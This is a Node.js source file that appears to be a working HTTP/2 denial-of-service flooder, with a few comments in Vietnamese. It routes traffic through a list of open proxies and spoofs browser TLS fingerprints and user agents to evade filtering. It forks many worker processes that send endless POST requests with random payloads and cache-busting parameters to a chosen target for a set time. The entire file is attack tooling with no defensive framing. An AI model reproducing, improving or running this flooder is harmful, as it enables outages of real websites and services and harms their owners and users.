const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
const util = require('util');
const v8 = require("v8");

// ########### START OF OPTIMIZATIONS ###########
const MAX_CONNECTIONS_PER_WORKER = 50;
const PROXY_HEALTH_CHECK_INTERVAL = 5000;
const HTTP2_SESSION_TIMEOUT = 30000;
const MAX_PROXY_RETRIES = 3;

class ConnectionPool {
    constructor() {
        this.pool = new Map();
        this.proxyStatus = new Map();
        setInterval(() => this.healthCheck(), PROXY_HEALTH_CHECK_INTERVAL);
    }

    get(proxyKey) {
        return this.pool.get(proxyKey)?.filter(conn => 
            !conn.destroyed && !conn.closed
        ) || [];
    }

    add(proxyKey, connection) {
        if (!this.pool.has(proxyKey)) {
            this.pool.set(proxyKey, []);
        }
        this.pool.get(proxyKey).push(connection);
    }

    async healthCheck() {
        for (const [proxyKey] of this.pool) {
            const isHealthy = await this.checkProxy(proxyKey);
            this.proxyStatus.set(proxyKey, isHealthy);
        }
    }

    async checkProxy(proxyKey) {
        try {
            const [host, port] = proxyKey.split(':');
            const tester = new NetSocket();
            return await new Promise(resolve => {
                tester.HTTP({ host, port }, (_, err) => resolve(!err));
            });
        } catch {
            return false;
        }
    }

    getHealthyProxies() {
        return Array.from(this.proxyStatus.entries())
            .filter(([_, healthy]) => healthy)
            .map(([proxyKey]) => proxyKey);
    }
}

const connectionPool = new ConnectionPool();

class ProxyRotator {
    constructor(proxies) {
        this.proxies = proxies;
        this.index = 0;
    }

    next() {
        const healthyProxies = connectionPool.getHealthyProxies();
        if (healthyProxies.length > 0) {
            this.index = (this.index + 1) % healthyProxies.length;
            return healthyProxies[this.index];
        }
        return randomElement(this.proxies);
    }
}
// ########### END OF OPTIMIZATIONS ###########

const lookupPromise = util.promisify(dns.lookup);
let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP', url + ':', isp);
        }
    } catch {}
}

const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
  console.log('node flood target time rate thread proxy');
  process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
    
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateUserAgent = (browser) => {
    const versions = {
        chrome: { min: 124, max: 134 },
        safari: { min: 14, max: 16 },
        brave: { min: 124, max: 134 },
        firefox: { min: 125, max: 135 },
        mobile: { min: 127, max: 135 },
        opera: { min: 125, max: 129 },
        operagx: { min: 125, max: 132 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;

    const userAgentMap = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
    };

    return userAgentMap[browser];
};

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
] 

let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear()
    console.log("[>] Heap Size:", (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString());
    console.log('[>] Target: ' + process.argv[2]);
    console.log('[>] Time: ' + process.argv[3]);
    console.log('[>] Rate: ' + process.argv[4]);
    console.log('[>] Thread(s): ' + process.argv[5]);
    getIPAndISP(targetURL);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads*15; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads*15; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder, 1)}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomElement(elements) {
    return elements[randomIntn(0, elements.length - 1)];
}
const userAgent = generateUserAgent(getRandomBrowser());

// Hàm tạo payload ngẫu nhiên cho POST
function generateRandomPayload() {
    const payloadSize = randomIntn(1024, 2048); // Kích thước payload từ 1KB đến 2KB
    return crypto.randomBytes(payloadSize).toString('hex');
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"

    // Thêm tham số ngẫu nhiên để phá vỡ cache
    const cacheBuster = crypto.randomBytes(8).toString('hex');
    const pathWithCacheBuster = parsedTarget.path + (parsedTarget.path.includes('?') ? '&' : '?') + `cb=${cacheBuster}`;

    let author = {
       ":authority": parsedTarget.host,
       ":method": "POST", // Thay đổi thành POST
       ":path": pathWithCacheBuster, // Thêm tham số phá vỡ cache
       ":scheme": "https",
    }

    const dynHeaders = {
        'sec-ch-ua-mobile': '?0',
        'upgrade-insecure-requests': '1',
        'user-agent': userAgent,
        'accept': randomElement(accept_header),
        'accept-encoding': 'br, gzip',
        'accept-language': 'en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded', // Thêm content-type cho POST
        ...author,
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        const settings = {
           enablePush: false,
           initialWindowSize: 1073741823
       };

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: ["h2","http/1.1"],
           ciphers: ciphers,
           sigalgs: sigalgs,
           requestCert: true,
           socket: connection,
           ecdhCurve: ecdhCurve,
           honorCipherOrder: false,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol
       };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 100000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
               headerTableSize: 65536,
               maxConcurrentStreams: 1000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 262144,
               enablePush: false
           },
           maxSessionMemory: 3333,
           maxDeflateDynamicTableSize: 4294967295,
           createConnection: () => tlsConn,
           socket: connection,
       });

       client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           maxFrameSize: 40000,
           enablePush: false
       });

       client.setMaxListeners(0);
       client.settings(settings);

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const payload = generateRandomPayload(); // Tạo payload ngẫu nhiên
                   const request = client.request(dynHeaders);
                   request.write(payload); // Gửi payload trong yêu cầu POST
                   request.end();
                   request.on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
               }
           }, 0); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});